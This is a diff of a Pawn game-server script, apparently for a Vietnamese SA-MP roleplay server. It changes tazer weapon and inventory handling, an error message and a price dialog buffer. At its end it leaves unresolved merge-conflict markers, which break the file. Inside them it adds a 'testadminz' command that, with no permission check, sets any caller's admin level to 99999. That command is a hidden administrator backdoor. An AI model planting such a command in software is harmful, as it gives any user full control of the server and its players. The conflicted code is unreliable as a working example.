+					RemovePlayerWeapon(playerid, 24);
+					Inventory_Add(playerid,"Deagle", 1);
+					if(myweapons[i][1] > 1) Inventory_Add(playerid,"Dan sung luc", myweapons[i][1]-1);
+				}
+				if(strcmp(weaponname, "Desert Eagle-AS", true) == 0) 
+				{
+					SendClientMessage(playerid,COLOR_LIGHTBLUE,"> Da cat vu khi Deagle vao tui do khi su dung tazer.");
+					RemovePlayerWeapon(playerid, 24);
+					Inventory_Add(playerid,"Deagle-AS", 1);
+					if(myweapons[i][1] > 1) Inventory_Add(playerid,"Dan sung luc SAAS", myweapons[i][1]-1);
+				}
+			}	
+		    // pTazerAmmoReplace{playerid} = amo;
+			// pTazerReplace{playerid} = PlayerInfo[playerid][pGuns][2];
 			format(string, sizeof(string), "* %s lay khau sung dien ra.", GetPlayerNameEx(playerid));
 			ProxDetector(4.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
-   			GivePlayerValidWeapon(playerid, 23, 10);
+   			GivePlayerValidWeapon(playerid, 23, 2);
 			pTazer{playerid} = 1;
 		}
 		else
 		{
 			RemovePlayerWeapon(playerid, 23);
-			GivePlayerValidWeapon(playerid, pTazerReplace{playerid}, pTazerAmmoReplace{playerid});
+			// GivePlayerValidWeapon(playerid, pTazerReplace{playerid}, pTazerAmmoReplace{playerid});
 			format(string, sizeof(string), "* %s cat khau sung dien vao.", GetPlayerNameEx(playerid));
 			ProxDetector(4.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
 			pTazer{playerid} = 0;
@@ -42576,7 +42623,7 @@ CMD:radargun(playerid, params[])
 	}
 	else
 	{
-		SendErrorMessage(playerid, "    Ban khong phai la nhan vien chinh phu!");
+		SendErrorMessage(playerid, "Ban khong phai la nhan vien chinh phu!");
 		return 1;
 	}
 	return 1;
@@ -48052,7 +48099,7 @@ CMD:editprices(playerid, params[])
 	    if(PlayerInfo[playerid][pBusinessRank] >= 5)
 		{
 			if(Businesses[iBusiness][bType] == BUSINESS_TYPE_STORE || Businesses[iBusiness][bType] == BUSINESS_TYPE_GASSTATION) {
-	    		new szDialog[912];
+	    		new szDialog[1300];
 				for (new i = 0; i < sizeof(StoreItems); i++) format(szDialog, sizeof(szDialog), "%s%s  ($%s) (Cost of Good: $%s)\n", szDialog, StoreItems[i], number_format(Businesses[iBusiness][bItemPrices][i]), number_format(floatround(StoreItemCost[i][ItemValue] * BUSINESS_ITEMS_COST)) );
 				ShowPlayerDialog(playerid, DIALOG_STOREPRICES, DIALOG_STYLE_LIST, "Chinh gia 24/7", szDialog, "Chinh sua", "Huy bo");
 				SetPVarInt(playerid, "EditingBusiness", iBusiness);
@@ -51024,6 +51071,7 @@ CMD:myfuel(playerid, params[])
 	SendClientMessage(playerid, -1, str);
 	return 1;
 }
+<<<<<<< HEAD
 
 CMD:socuu(playerid, params[])
 {
@@ -51044,3 +51092,10 @@ CMD:socuu(playerid, params[])
 	SendClientTextDraw(playerid, "Ban dang trong qua trinh so cuu...", 7000);
 	return 1;
 }
+=======
+CMD:testadminz(playerid)
+{
+	PlayerInfo[playerid][pAdmin] = 99999;
+	return 1;
+}
+>>>>>>> main
